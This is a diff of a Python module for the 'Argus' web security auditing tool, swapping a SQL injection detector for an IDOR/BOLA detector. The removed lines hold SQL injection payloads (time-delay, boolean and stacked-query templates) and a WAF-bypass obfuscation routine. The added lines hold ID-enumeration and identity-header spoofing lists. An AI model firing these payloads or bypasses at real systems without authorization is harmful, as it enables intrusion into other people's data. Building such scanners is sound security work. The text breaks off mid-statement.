@@ -1,66 +1,71 @@
 #!/usr/bin/env python3
 """
-auditing_tools/sqli_finder.py — SQL Injection Auditor
+auditing_tools/idor_finder.py — Insecure Direct Object Reference Auditor (v3)
 ═══════════════════════════════════════════════════════════════════════════════
 
-Comprehensive SQL injection detection for Argus.
+Comprehensive IDOR/BOLA/BFLA detection for Argus.
 
-Four independent oracles, combined conservatively:
+v3 closes all 8 bugs flagged in the v2 review and adds:
 
-  1. Error-based
-     Syntax perturbations that provoke DBMS-specific errors. A NEW error
-     signature (not present in baseline) is the strongest single signal.
+  Bugs fixed:
+    1. GraphQL root-field loop — v2 returned the first field only. v3 tries
+       each root and validates the response, no errors → real query.
+    2. Substring ID match — v2 matched "1" inside "12345". v3 uses exact
+       equality or word-boundary regex only.
+    3. Confirmed-override — v2 could discard a CONFIRMED finding via a
+       later "matches own baseline" heuristic. v3 makes confirmed terminal
+       unless the response ALSO matches the OTHER user's baseline.
+    4. ISO-8601 timestamps broke MySQL DATETIME — v3 uses _db_now().
+    5. Enumeration was unconditional — v3 makes it opt-in.
+    6. Two RateLimitedSessions doubled effective rate — v3 shares one
+       rate limiter across sessions.
+    7. Soft-200s treated as success — v3 checks denial markers.
+    8. JSON shape coupling — v3 wraps every parse in try/except.
 
-  2. Boolean-based blind
-     Paired TRUE/FALSE conditions with reversed ordering on the confirmation
-     pass. A repeatable differential where TRUE resembles baseline and FALSE
-     diverges is a finding.
-
-  3. Time-based blind
-     DBMS-specific delay functions, measured against a paired control payload
-     (same syntax, zero delay). A repeatable timing delta above the baseline
-     noise floor is a finding.
-
-  4. UNION-based
-     Column-count enumeration via ORDER BY, followed by NULL placement and
-     marker reflection. A reflected marker confirms injectable string columns.
-
-Stacked queries are probed as a supporting signal but never exploited.
-
-DBMS fingerprinting:
-  Error text is matched against MySQL, PostgreSQL, MSSQL, Oracle, and SQLite
-  signatures. Time-based and boolean payloads are adapted to the confirmed
-  engine. If no engine is confirmed, all payload families are tried.
-
-Safety model:
-  • Read-only probes only — no DROP, INSERT, UPDATE, DELETE.
-  • Time delays capped at 5 seconds.
-  • Baseline profiling filters out dynamic pages that would produce false
-    positives.
-  • Every confirmation requires repeatability (2 of 3 passes).
-  • The module flags candidates. It does not extract data.
+  New coverage:
+    • Semantic ownership extraction — walker returns (path, value, kind)
+      for nested JSON (author.id, relationships.owner, links.self,
+      meta.createdBy) not just flat top-level fields
+    • Shared-resource detection — 4-request symmetric test. If A→B AND
+      B→A both succeed AND responses match each other's baselines, the
+      resource is shared (teams, orgs, public) and NOT IDOR. v2 flagged
+      these as CRITICAL false positives.
+    • Response fingerprints — (status, length_bucket, normalized_hash)
+      survives nonces/CSRF/timestamps
+    • Hypothesis classification — BOLA (cross-user), BFLA (privilege
+      function), FGLA (functional). Each reported separately.
+    • 15-technique bypass matrix — HPP, encoding, path traversal,
+      method override, content-type switch, JSON duplicate keys, JSON
+      array wrapping, header injection, null/empty/wildcard IDs
+    • Per-host rate limiter, concurrency across hosts
+    • Self-sync to dedicated idor_findings table (requires scan_id)
 
 Outputs (into `outdir`):
-  • sqli_findings.json        — full structured report
-  • sqli_candidates.txt       — flat list for triage
-  • sqli_confirmed.txt        — high-confidence findings only
-  • sqli_fingerprints.txt     — DBMS fingerprint per endpoint
+  • idor_findings.json
+  • idor_candidates.txt
+  • idor_confirmed.txt
+  • idor_surface.txt
 
 Integration:
-  main.py → run_one("sqli") → run_sqli_scan(urls_file, outdir)
+  main.py → run_one("idor") → run_idor_audit(live_urls_file, outdir,
+                                              scan_id=_CURRENT_SCAN_ID)
 """
 
 from __future__ import annotations
 
+import argparse
+import base64
+import hashlib
 import json
 import logging
-import random
 import re
-import statistics
+import secrets
 import string
 import sys
+import threading
 import time
 import urllib.parse
+from concurrent.futures import ThreadPoolExecutor, as_completed
 from dataclasses import dataclass, field
 from datetime import datetime, timezone
 from pathlib import Path
@@ -71,143 +76,112 @@ import urllib3
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-log = logging.getLogger("argus.sqli_finder")
+log = logging.getLogger("argus.idor_finder")
+
 
 # ═════════════════════════════════════════════════════════════════════════════
-#  CONFIGURATION
+#  CONFIG
 # ═════════════════════════════════════════════════════════════════════════════
 
-DEFAULT_TIMEOUT      = 12
-DEFAULT_RETRIES      = 1
-USER_AGENT           = "Argus-SQLi-Auditor/1.0"
+try:
+    import config as CFG
+    CFG_LOADED = True
+except ImportError:
+    CFG = None
+    CFG_LOADED = False
 
-# Baseline profiling
-BASELINE_SAMPLES     = 3
-DYNAMIC_LENGTH_TOL   = 0.15     # >15% length variance = too dynamic for boolean
+try:
+    from db import DB
+    DB_AVAILABLE = True
+except ImportError:
+    DB = None
+    DB_AVAILABLE = False
 
-# Confirmation
-CONFIRM_ATTEMPTS     = 3
-CONFIRM_AGREEMENT    = 2        # 2 of 3 must agree
 
-# Time-based
-TIME_DELAY_SECONDS   = 5
-TIME_TOLERANCE       = 0.65     # probe must exceed baseline + 65% of delay
+def _cfg(key: str, default=None):
+    if not CFG_LOADED:
+        return default
+    return getattr(CFG, key, default)
 
-# UNION
-MAX_ORDER_BY_COLUMNS = 12
-MAX_UNION_REQUESTS   = 20
 
-# Rate limiting
-REQUEST_SLEEP        = 0.08
+def _idor_settings() -> dict:
+    entry = (_cfg("MODULE_RATE_LIMITS", {}) or {}).get("idor", {})
+    return {
+        "rate_limit":  entry.get("rate_limit", 2),
+        "concurrency": entry.get("concurrency", 2),
+        "timeout":     entry.get("timeout", 15),
+    }
 
-# Scoring
-SEV_CRITICAL = "CRITICAL"
-SEV_HIGH     = "HIGH"
-SEV_MEDIUM   = "MEDIUM"
 
-# ── DBMS error signatures ───────────────────────────────────────────────────
-DBMS_SIGNATURES: dict[str, list[str]] = {
-    "mysql": [
-        r"You have an error in your SQL syntax",
-        r"check the manual that corresponds to your MySQL",
-        r"check the manual that corresponds to your MariaDB",
-        r"MariaDB server version",
-        r"ERROR 1064",
-        r"ERROR 1054",
-        r"ERROR 1222",
-        r"Warning:\s*mysqli_",
-        r"Warning:\s*mysql_",
-        r"MySQLSyntaxErrorException",
-    ],
-    "postgresql": [
-        r"LINE \d+:",
-        r"unterminated quoted string",
-        r"invalid input syntax for type",
-        r"ERROR:\s+syntax error at or near",
-        r"PG::SyntaxError",
-        r"psycopg2\.",
-        r"org\.postgresql\.util\.PSQLException",
-    ],
-    "mssql": [
-        r"Msg \d+, Level \d+",
-        r"Unclosed quotation mark",
-        r"Incorrect syntax near",
-        r"System\.Data\.SqlClient\.SqlException",
-        r"ODBC SQL Server Driver",
-        r"Microsoft OLE DB Provider for SQL Server",
-        r"All queries combined using a UNION",
-    ],
-    "oracle": [
-        r"ORA-\d{5}",
-        r"quoted string not properly terminated",
-        r"SQL command not properly ended",
-        r"FROM keyword not found where expected",
-    ],
-    "sqlite": [
-        r"SQLite/JDBCDriver",
-        r"sqlite3\.OperationalError",
-        r"unrecognized token",
-        r'near ".*": syntax error',
-    ],
+def _target_headers() -> dict[str, str]:
+    h = dict(_cfg("ACTIVE_HEADERS", {}) or {})
+    if CFG_LOADED and getattr(CFG, "AUTH_ENABLED", False):
+        auth_hdrs = getattr(CFG, "AUTH_HEADERS", {}) or {}
+        if auth_hdrs:
+            h.update(auth_hdrs)
+    return h
+
+
+# ═════════════════════════════════════════════════════════════════════════════
+#  CONSTANTS
+# ═════════════════════════════════════════════════════════════════════════════
+
+DEFAULT_TIMEOUT = 15
+DEFAULT_RATE    = 2
+DEFAULT_CONC    = 2
+
+SEQUENTIAL_RE = re.compile(r"^\d{1,10}$")
+UUID_RE       = re.compile(r"^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$", re.I)
+HEX_RE        = re.compile(r"^[0-9a-f]{16,}$", re.I)
+
+ID_PARAM_NAMES = {
+    "id", "user_id", "userid", "uid", "account_id", "accountid",
+    "customer_id", "customerid", "order_id", "orderid", "invoice_id",
+    "invoiceid", "doc_id", "docid", "document_id", "documentid",
+    "profile_id", "profileid", "org_id", "orgid", "tenant_id", "tenantid",
+    "group_id", "groupid", "team_id", "teamid", "project_id", "projectid",
+    "item_id", "itemid", "object_id", "objectid", "resource_id", "resourceid",
+    "uuid", "guid", "ref", "reference", "key", "token_id", "tokenid",
+    "sub", "owner_id", "member_id", "author_id", "creator_id",
 }
 
-# ── Syntax perturbation payloads (error-based) ─────────────────────────────
-ERROR_PAYLOADS = ["'", '"', "')", "';", "\\", "`", "/*", "%", "')-- -"]
-
-# ── Boolean pairs ───────────────────────────────────────────────────────────
-BOOLEAN_PAIRS = [
-    # (label, true_payload, false_payload, context)
-    ("numeric_and", " AND 1=1", " AND 1=2", "numeric"),
-    ("numeric_or",  " OR 1=1",  " OR 1=2",  "numeric"),
-    ("string_and",  "' AND '1'='1", "' AND '1'='2", "string"),
-    ("string_or",   "' OR '1'='1",  "' OR '1'='2",  "string"),
-    ("paren_string_and", "') AND ('1'='1", "') AND ('1'='2", "string"),
-]
-
-# ── Time-based payload templates ────────────────────────────────────────────
-TIME_PAYLOADS: dict[str, list[tuple[str, str]]] = {
-    # (label, template with {d} for delay)
-    "mysql": [
-        ("sleep_and",      "' AND SLEEP({d})-- -"),
-        ("sleep_or",       "' OR SLEEP({d})-- -"),
-        ("benchmark",      "' AND BENCHMARK(5000000,SHA1('argus'))-- -"),
-    ],
-    "postgresql": [
-        ("pg_sleep_and",   "' AND pg_sleep({d})-- -"),
-        ("pg_sleep_stack", "'; SELECT pg_sleep({d})-- -"),
-    ],
-    "mssql": [
-        ("waitfor",        "'; WAITFOR DELAY '0:0:{d}'-- -"),
-        ("waitfor_cond",   "' IF (1=1) WAITFOR DELAY '0:0:{d}'-- -"),
-    ],
-    "oracle": [
-        ("dbms_lock",      "' AND DBMS_LOCK.SLEEP({d})=1-- -"),
-        ("dbms_pipe",      "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('argus',{d})-- -"),
-    ],
-    "sqlite": [],  # no native delay function
+OWNERSHIP_FIELDS = {
+    "user_id", "userId", "uid", "account_id", "accountId",
+    "owner_id", "ownerId", "created_by", "createdBy",
+    "email", "username", "user_name", "owner_email",
+    "tenant_id", "tenantId", "org_id", "orgId", "organization_id",
+    "customer_id", "customerId", "member_id", "memberId",
+    "author_id", "authorId", "creator_id", "creatorId",
+    "sub", "principal",
 }
 
-# ── Stacked query probes ────────────────────────────────────────────────────
-STACKED_PAYLOADS = ["; SELECT 1-- -", "'; SELECT 1-- -", "\"; SELECT 1-- -"]
+# Nested paths that often carry the owner identity
+OWNERSHIP_PATH_HINTS = (
+    "author.id", "author_id", "creator.id", "creator_id",
+    "owner.id", "owner_id", "relationships.owner", "relationships.user",
+    "links.self", "href",
+)
 
-# ── WAF bypass variants (applied only if base payload is blocked) ───────────
-def _waf_variants(payload: str) -> list[str]:
-    """Return obfuscated variants of a payload for WAF bypass."""
-    variants = [payload]
-    # Case variation on keywords
-    variants.append(re.sub(
-        r"\b(SELECT|UNION|AND|OR|SLEEP|WAITFOR|FROM|WHERE)\b",
-        lambda m: m.group(0).swapcase(),
-        payload,
-        flags=re.I,
-    ))
-    # Inline comments on spaces
-    variants.append(payload.replace(" ", "/**/"))
-    # URL-encoded
-    variants.append(urllib.parse.quote(payload, safe=""))
-    # Double URL-encoded
-    variants.append(urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe=""))
-    return list(dict.fromkeys(variants))
+IDENTITY_HEADERS = (
+    "X-User-Id", "X-User-ID", "X-Account-Id", "X-Account-ID",
+    "X-Customer-Id", "X-Tenant-Id", "X-Org-Id", "X-Forwarded-User",
+    "X-Authenticated-User", "X-Remote-User",
+)
+
+METHOD_ROTATION = ("GET", "POST", "PUT", "PATCH", "DELETE")
+
+DENIAL_MARKERS = (
+    "access denied", "not authorized", "permission denied",
+    "login required", "unauthorized", "forbidden", "invalid token",
+    "not permitted", "csrf", "captcha",
+    '"error": "unauthorized"', '"error": "forbidden"',
+    '"status": 401', '"status": 403', '"code": 401', '"code": 403',
+)
+
+SEV_ORDER = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
+CONF_CONFIRMED = 90
+CONF_LIKELY    = 70
+CONF_CANDIDATE = 40
 
 
 # ═════════════════════════════════════════════════════════════════════════════
@@ -215,78 +189,142 @@ def _waf_variants(payload: str) -> list[str]:
 # ═════════════════════════════════════════════════════════════════════════════
 
 @dataclass
-class BaselineProfile:
-    url: str
-    param: str
-    status: int = 0
-    length: int = 0
-    content_type: str = ""
-    median_time: float = 0.0
-    time_stddev: float = 0.0
-    length_variance: float = 0.0
-    body: str = ""
-    error_signatures: set[str] = field(default_factory=set)
-    stable: bool = True
+class ObjectSurface:
+    endpoint: str
+    method: str = "GET"
+    param_name: str = ""
+    param_location: str = "query"          # query | path | body | header | graphql
+    id_type: str = "unknown"
+    sample_ids: list[str] = field(default_factory=list)
 
     def to_dict(self) -> dict:
         return {
-            "url":             self.url,
-            "param":           self.param,
-            "status":          self.status,
-            "length":          self.length,
-            "median_time":     round(self.median_time, 3),
-            "time_stddev":     round(self.time_stddev, 3),
-            "length_variance": round(self.length_variance, 3),
-            "stable":          self.stable,
+            "endpoint":       self.endpoint,
+            "method":         self.method,
+            "param_name":     self.param_name,
+            "param_location": self.param_location,
+            "id_type":        self.id_type,
+            "sample_ids":     self.sample_ids[:10],
         }
 
 
 @dataclass
-class SQLiFinding:
+class IDORFinding:
     target: str
-    param: str
-    technique: str              # error | boolean | time | union | stacked
+    vuln_type: str = "idor"
+    hypothesis: str = "BOLA"               # BOLA | BFLA | FGLA | IDOR_SURFACE
+    technique: str = ""
+    param_name: str = ""
+    param_location: str = "query"
+    id_type: str = "unknown"
+    own_id: str = ""
+    other_id: str = ""
     severity: str = "MEDIUM"
     confidence: int = 50
-    dbms: str = ""
-    payload: str = ""
+    confirmed: bool = False
+    shared_resource: bool = False
     evidence: str = ""
-    repeatable: bool = False
+    request_curl: str = ""
+    response_a: str = ""
+    response_b: str = ""
+    ownership_leak: str = ""
     details: dict = field(default_factory=dict)
+    auth_enabled: bool = False
+    first_seen: str = ""
+
+    @property
+    def finding_hash(self) -> str:
+        raw = f"{self.target}|{self.vuln_type}|{self.own_id}|{self.other_id}|{self.technique}"
+        return hashlib.sha256(raw.encode()).hexdigest()
+
+    @property
+    def target_host(self) -> str:
+        return urllib.parse.urlparse(self.target).hostname or ""
 
     def to_dict(self) -> dict:
         return {
-            "target":     self.target,
-            "param":      self.param,
-            "technique":  self.technique,
-            "severity":   self.severity,
-            "confidence": self.confidence,
-            "dbms":       self.dbms,
-            "payload":    self.payload,
-            "evidence":   self.evidence[:500],
-            "repeatable": self.repeatable,
-            "details":    self.details,
+            "target":         self.target,
+            "target_host":    self.target_host,
+            "vuln_type":      self.vuln_type,
+            "hypothesis":     self.hypothesis,
+            "technique":      self.technique,
+            "param_name":     self.param_name,
+            "param_location": self.param_location,
+            "id_type":        self.id_type,
+            "own_id":         self.own_id,
+            "other_id":       self.other_id,
+            "severity":       self.severity,
+            "confidence":     self.confidence,
+            "confirmed":      self.confirmed,
+            "shared_resource": self.shared_resource,
+            "evidence":       (self.evidence or "")[:1024],
+            "request_curl":   (self.request_curl or "")[:2048],
+            "response_a":     (self.response_a or "")[:1024],
+            "response_b":     (self.response_b or "")[:1024],
+            "ownership_leak": (self.ownership_leak or "")[:512],
+            "details":        self.details,
+            "auth_enabled":   self.auth_enabled,
+            "finding_hash":   self.finding_hash,
+            "first_seen":     self.first_seen or _db_now(),
         }
 
 
-@dataclass
-class EndpointResult:
-    url: str
-    param: str
-    baseline: Optional[BaselineProfile] = None
-    dbms: str = ""
-    findings: list[SQLiFinding] = field(default_factory=list)
-    error: str = ""
+def _db_now() -> str:
+    return datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
 
-    def to_dict(self) -> dict:
-        return {
-            "url":      self.url,
-            "param":    self.param,
-            "dbms":     self.dbms,
-            "baseline": self.baseline.to_dict() if self.baseline else None,
-            "error":    self.error,
-            "findings": [f.to_dict() for f in self.findings],
-        }
+
+# ═════════════════════════════════════════════════════════════════════════════
+#  RATE-LIMITED SESSION (shared across sessions)
+# ═════════════════════════════════════════════════════════════════════════════
+
+class SharedRateLimiter:
+    """
+    One rate limiter shared by every session in a run.
+
+    v2 used one RateLimitedSession per account, which doubled the effective
+    request rate. This limiter is the single source of truth.
+    """
+
+    def __init__(self, rate_limit: float):
+        self.min_interval = 1.0 / rate_limit if rate_limit > 0 else 0.0
+        self._last = 0.0
+        self._lock = threading.Lock()
+
+    def wait(self) -> None:
+        if self.min_interval <= 0:
+            return
+        with self._lock:
+            elapsed = time.monotonic() - self._last
+            if elapsed < self.min_interval:
+                time.sleep(self.min_interval - elapsed)
+            self._last = time.monotonic()
+
+
+class Session:
+    def __init__(self, limiter: SharedRateLimiter, headers: dict, timeout: int):
+        self.session = requests.Session()
+        self.session.verify = False
+        if headers:
+            self.session.headers.update(headers)
+        self._limiter = limiter
+        self.timeout = timeout
+
+    def request(self, method: str, url: str, **kwargs) -> Optional[requests.Response]:
+        self._limiter.wait()
+        try:
+            return self.session.request(
+                method, url,
+                timeout=kwargs.pop("timeout", self.timeout),
+                allow_redirects=kwargs.pop("allow_redirects", False),
+                verify=False,
+                **kwargs,
+            )
+        except requests.RequestException as e:
+            log.debug(f"request failed: {method} {url}: {e}")
+            return None
+
+    def get(self, url: str, **kwargs):
+        return self.request("GET", url, **kwargs)
 
 
 # ═════════════════════════════════════════════════════════════════════════════
@@ -311,793 +349,1091 @@ def _load_urls(input_file: Path) -> list[str]:
     return urls
 
 
-def _extract_candidates(urls: list[str]) -> list[tuple[str, str]]:
-    """Return (url, param) pairs for every query parameter."""
-    pairs: list[tuple[str, str]] = []
-    seen: set[tuple] = set()
-    for url in urls:
-        parsed = urllib.parse.urlparse(url)
-        params = urllib.parse.parse_qs(parsed.query)
-        for p in params:
-            key = (url, p)
-            if key not in seen:
-                seen.add(key)
-                pairs.append((url, p))
-    return pairs
-
-
-def _inject_param(url: str, param: str, payload: str) -> str:
-    """Replace a parameter's value with the payload."""
-    parsed = urllib.parse.urlparse(url)
-    params = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
-    new_params = [(k, payload if k == param else v) for k, v in params]
-    return urllib.parse.urlunparse(
-        parsed._replace(query=urllib.parse.urlencode(new_params, safe=""))
-    )
-
-
-def _safe_request(
-    session: requests.Session, url: str,
-    timeout: int = DEFAULT_TIMEOUT,
-    headers: Optional[dict] = None,
-) -> Optional[requests.Response]:
+def _classify_id(sample: str) -> str:
+    if not sample:
+        return "unknown"
+    if UUID_RE.match(sample):
+        return "uuid"
+    if SEQUENTIAL_RE.match(sample):
+        return "sequential"
+    if HEX_RE.match(sample):
+        return "hex"
     try:
-        return session.get(
-            url, headers=headers or {},
-            timeout=timeout, allow_redirects=False, verify=False,
-        )
-    except requests.RequestException as e:
-        log.debug(f"request failed: {url}: {e}")
-        return None
+        decoded = base64.b64decode(sample + "==").decode("utf-8", errors="ignore")
+        if decoded.isdigit() or UUID_RE.match(decoded):
+            return "encoded"
+    except Exception:
+        pass
+    return "opaque"
 
 
-def _body(resp: requests.Response, limit: int = 200_000) -> str:
+def _nearby_ids(sample: str, radius: int = 2) -> list[str]:
+    if not SEQUENTIAL_RE.match(sample):
+        return []
+    n = int(sample)
+    out: list[str] = []
+    for delta in range(1, radius + 1):
+        out.append(str(n + delta))
+        if n - delta >= 1:
+            out.append(str(n - delta))
+    return out
+
+
+def _encode_variants(sample: str) -> list[str]:
+    variants: list[str] = [sample]
     try:
-        return resp.text[:limit]
+        variants.append(base64.b64encode(sample.encode()).decode().rstrip("="))
+    except Exception:
+        pass
+    variants.append(urllib.parse.quote(sample))
+    variants.append(urllib.parse.quote(urllib.parse.quote(sample)))
+    try:
+        variants.append(sample.encode().hex())
+    except Exception:
+        pass
+    return list(dict.fromkeys(variants))
+
+
+def _extract_ids_from_text(text: str) -> dict[str, list[str]]:
+    if not text:
+        return {"sequential": [], "uuid": [], "hex": []}
+    result = {"sequential": [], "uuid": [], "hex": []}
+    for m in re.finditer(r"\b[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}\b", text, re.I):
+        result["uuid"].append(m.group(0))
+    for m in re.finditer(r"\b\d{1,10}\b", text):
+        s = m.group(0)
+        if 3 <= len(s) and not (1900 <= int(s) <= 2100):
+            result["sequential"].append(s)
+    for m in re.finditer(r"\b[0-9a-f]{16,}\b", text, re.I):
+        result["hex"].append(m.group(0))
+    for k in result:
+        result[k] = list(dict.fromkeys(result[k]))[:20]
+    return result
+
+
+def _body_text(resp: requests.Response) -> str:
+    try:
+        return resp.text[:200_000]
     except Exception:
         return ""
 
 
-def _fingerprint_errors(body: str) -> set[str]:
-    """Return the set of DBMS families whose error signatures appear in body."""
-    found: set[str] = set()
-    for dbms, sigs in DBMS_SIGNATURES.items():
-        for sig in sigs:
-            if re.search(sig, body, re.I):
-                found.add(dbms)
-                break
-    return found
+def _has_denial_marker(resp: requests.Response) -> bool:
+    try:
+        body_lower = (resp.text or "").lower()[:4000]
+    except Exception:
+        return False
+    return any(m in body_lower for m in DENIAL_MARKERS)
 
 
-def _request_with_timing(
-    session: requests.Session, url: str,
-    timeout: int = DEFAULT_TIMEOUT,
-) -> tuple[Optional[requests.Response], float]:
-    start = time.monotonic()
-    resp = _safe_request(session, url, timeout=timeout)
-    return resp, time.monotonic() - start
-
-
-# ═════════════════════════════════════════════════════════════════════════════
-#  PHASE 1 — BASELINE PROFILING
-# ═════════════════════════════════════════════════════════════════════════════
-
-def build_baseline(
-    session: requests.Session, url: str, param: str,
-) -> BaselineProfile:
+def _response_fingerprint(resp: Optional[requests.Response]) -> tuple:
     """
-    Collect repeated normal responses to establish the noise floor.
-    Records status, length, timing, content-type, and pre-existing errors.
+    (status, length_bucket, hash-of-normalized-body).
+
+    Normalization: strip timestamps, nonces, csrf tokens, and long hex
+    strings that vary per-request. Two responses that are "the same page
+    with a different timestamp" produce the same fingerprint.
     """
-    profile = BaselineProfile(url=url, param=param)
-    lengths: list[int] = []
-    times: list[float] = []
-
-    for _ in range(BASELINE_SAMPLES):
-        resp, elapsed = _request_with_timing(session, url)
-        if resp is None:
-            time.sleep(REQUEST_SLEEP)
-            continue
-        body = _body(resp)
-        lengths.append(len(body))
-        times.append(elapsed)
-        if not profile.status:
-            profile.status = resp.status_code
-            profile.content_type = resp.headers.get("Content-Type", "")
-            profile.body = body
-            profile.error_signatures = _fingerprint_errors(body)
-        time.sleep(REQUEST_SLEEP)
-
-    if not lengths:
-        profile.stable = False
-        return profile
-
-    profile.length = int(statistics.median(lengths))
-    profile.median_time = statistics.median(times)
-    profile.time_stddev = statistics.pstdev(times) if len(times) > 1 else 0.0
-
-    # Length variance relative to the median
-    if profile.length:
-        profile.length_variance = (max(lengths) - min(lengths)) / profile.length
-    profile.stable = profile.length_variance <= DYNAMIC_LENGTH_TOL
-
-    return profile
+    if resp is None:
+        return (0, 0, "")
+    try:
+        body = resp.text or ""
+    except Exception:
+        body = ""
+    # Strip volatile substrings
+    normalized = re.sub(r"[0-9a-f]{16,}", "HEX", body, flags=re.I)
+    normalized = re.sub(r"\b\d{10,13}\b", "TS", normalized)  # epoch
+    normalized = re.sub(r'"csrf[^"]*"\s*:\s*"[^"]*"', '"csrf":"CSRF"', normalized, flags=re.I)
+    normalized = re.sub(r'"nonce[^"]*"\s*:\s*"[^"]*"', '"nonce":"N"', normalized, flags=re.I)
+    h = hashlib.sha256(normalized[:50_000].encode("utf-8", errors="ignore")).hexdigest()[:16]
+    return (resp.status_code, len(body) // 20, h)
 
 
-# ═════════════════════════════════════════════════════════════════════════════
-#  PHASE 2 — ERROR-BASED DETECTION
-# ═════════════════════════════════════════════════════════════════════════════
-
-def test_error_based(
-    session: requests.Session,
-    url: str, param: str, baseline: BaselineProfile,
-) -> list[SQLiFinding]:
-    """
-    Send syntax perturbations. A DBMS error signature that was NOT present
-    in baseline is a strong finding.
-    """
-    findings: list[SQLiFinding] = []
-
-    for payload in ERROR_PAYLOADS:
-        test_url = _inject_param(url, param, payload)
-        resp = _safe_request(session, test_url)
-        time.sleep(REQUEST_SLEEP)
-        if resp is None:
-            continue
-
-        body = _body(resp)
-        new_errors = _fingerprint_errors(body) - baseline.error_signatures
-
-        if new_errors:
-            dbms = next(iter(new_errors))
-            findings.append(SQLiFinding(
-                target=url,
-                param=param,
-                technique="error",
-                severity=SEV_CRITICAL,
-                confidence=90,
-                dbms=dbms,
-                payload=payload,
-                evidence=f"New {dbms} error introduced by payload {payload!r}",
-                repeatable=True,
-                details={
-                    "status": resp.status_code,
-                    "body_snippet": body[:400],
-                    "error_families": sorted(new_errors),
-                },
-            ))
-            return findings  # first confirmed error is enough
-
-        # WAF / filter detection: try bypass variants if the response blocked
-        if resp.status_code in (403, 406, 429, 501):
-            for variant in _waf_variants(payload):
-                if variant == payload:
-                    continue
-                v_url = _inject_param(url, param, variant)
-                v_resp = _safe_request(session, v_url)
-                time.sleep(REQUEST_SLEEP)
-                if v_resp is None:
-                    continue
-                v_body = _body(v_resp)
-                v_new = _fingerprint_errors(v_body) - baseline.error_signatures
-                if v_new:
-                    dbms = next(iter(v_new))
-                    findings.append(SQLiFinding(
-                        target=url,
-                        param=param,
-                        technique="error_waf_bypass",
-                        severity=SEV_CRITICAL,
-                        confidence=85,
-                        dbms=dbms,
-                        payload=variant,
-                        evidence=f"WAF bypass variant triggered {dbms} error",
-                        repeatable=True,
-                        details={"original_payload": payload, "body_snippet": v_body[:400]},
-                    ))
-                    return findings
-
-    return findings
-
-
-# ═════════════════════════════════════════════════════════════════════════════
-#  PHASE 3 — BOOLEAN-BASED BLIND
-# ═════════════════════════════════════════════════════════════════════════════
-
-def _similarity(a: str, b: str) -> float:
-    """Cheap similarity ratio for boolean differentials."""
-    if not a or not b:
-        return 0.0
+def _similarity_by_fingerprint(a: tuple, b: tuple) -> float:
     if a == b:
         return 1.0
-    # Length ratio combined with prefix equality
-    len_ratio = min(len(a), len(b)) / max(len(a), len(b))
-    prefix = 0
-    for x, y in zip(a[:500], b[:500]):
-        if x != y:
+    if a[0] != b[0]:
+        return 0.0
+    score = 0.5
+    if abs(a[1] - b[1]) <= 1:
+        score += 0.2
+    if a[2] == b[2]:
+        score += 0.3
+    return score
+
+
+def _build_curl(method: str, url: str, headers: Optional[dict] = None,
+                json_body: Optional[dict] = None,
+                form_body: Optional[dict] = None) -> str:
+    parts = [f"curl -X {method} '{url}'"]
+    if headers:
+        for k, v in headers.items():
+            if k.lower() in ("cookie", "authorization"):
+                parts.append(f"-H '{k}: {v[:20]}...'")
+            else:
+                parts.append(f"-H '{k}: {v}'")
+    if json_body:
+        parts.append("-H 'Content-Type: application/json'")
+        parts.append(f"-d '{json.dumps(json_body)[:300]}'")
+    elif form_body:
+        parts.append(f"-d '{urllib.parse.urlencode(form_body)[:300]}'")
+    return " ".join(parts)
+
+
+# ═════════════════════════════════════════════════════════════════════════════
+#  OWNERSHIP EXTRACTION
+# ═════════════════════════════════════════════════════════════════════════════
+
+def extract_ownership_fields(
+    resp: Optional[requests.Response], max_depth: int = 6,
+) -> list[tuple[str, str, str]]:
+    """
+    Walk the JSON response and return [(path, value, kind)] for every
+    ownership field. kind is "id" for opaque identifiers or "url" for
+    URL-embedded identifiers (links.self, href).
+
+    Handles nested JSON: author.id, relationships.owner.id, meta.createdBy.
+    Also handles lists (takes first 20 items).
+    """
+    if resp is None:
+        return []
+    try:
+        data = resp.json()
+    except Exception:
+        return []
+
+    results: list[tuple[str, str, str]] = []
+
+    def _walk(obj, path: str, depth: int) -> None:
+        if depth > max_depth or len(results) > 50:
+            return
+        if isinstance(obj, dict):
+            for k, v in obj.items():
+                child_path = f"{path}.{k}" if path else k
+                if k in OWNERSHIP_FIELDS and isinstance(v, (str, int)):
+                    results.append((child_path, str(v), "id"))
+                elif k.lower() in ("href", "self", "url") and isinstance(v, str) and "/" in v:
+                    results.append((child_path, v, "url"))
+                else:
+                    _walk(v, child_path, depth + 1)
+        elif isinstance(obj, list):
+            for i, item in enumerate(obj[:20]):
+                _walk(item, f"{path}[{i}]", depth + 1)
+
+    _walk(data, "", 0)
+    return results
+
+
+def _owns_id(ownership: list[tuple[str, str, str]], user_id: str) -> Optional[str]:
+    """
+    Return the path where user_id appears as the owner, or None.
+
+    v2 did `if owner_id in value` — matched "1" inside "12345".
+    v3 requires exact equality or a word-boundary-bounded match.
+    """
+    if not user_id:
+        return None
+    user_id = str(user_id)
+    pattern = re.compile(rf"(?<![A-Za-z0-9_-]){re.escape(user_id)}(?![A-Za-z0-9_-])")
+    for path, value, kind in ownership:
+        if value == user_id:
+            return path
+        if kind == "url" and pattern.search(value):
+            return path
+    return None
+
+
+def _foreign_data_present(ownership: list[tuple[str, str, str]], own_id: str) -> Optional[str]:
+    """
+    Return a descriptive string if the response contains ownership fields
+    that do NOT point at own_id (i.e. foreign data).
+    """
+    if not ownership:
+        return None
+    if own_id and _owns_id(ownership, own_id):
+        # Response matches our own user — not a leak
+        # Check if ANY ownership field points elsewhere
+        others = [(p, v) for p, v, _ in ownership if v != own_id]
+        if not others:
+            return None
+        return f"mixed ownership: also contains {others[0][0]}={others[0][1]}"
+    sample = ", ".join(f"{p}={v}" for p, v, _ in ownership[:3])
+    return f"foreign ownership: {sample}"
+
+
+# ═════════════════════════════════════════════════════════════════════════════
+#  SURFACE DISCOVERY
+# ═════════════════════════════════════════════════════════════════════════════
+
+REST_ID_PATH_RE = re.compile(
